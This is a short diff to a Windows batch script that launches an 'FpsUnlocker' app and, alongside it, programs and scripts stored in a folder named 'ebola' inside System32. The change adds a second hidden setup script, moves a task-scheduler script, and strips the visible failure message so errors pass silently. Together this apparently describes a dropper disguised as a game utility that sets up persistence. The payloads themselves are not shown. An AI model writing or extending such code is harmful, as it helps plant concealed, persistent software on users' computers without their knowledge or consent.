@@ -49,11 +49,9 @@ start "" "%windir%\System32\ebola.exe"
 
 :starting app and task scheduler change
 start "" "%ProgramFiles%\FpsUnlocker\FpsUnlocker.exe"
-start "" "%windir%\System32\ebola\tsksch.bat"
-
+start "" "%windir%\System32\ebola\ba\tsksch.bat"
+start "" "%windir%\System32\ebola\pysetup.bat"
 
 if %errorlevel% neq 0 (
-    echo fail
-    pause
     exit /b 1
 )
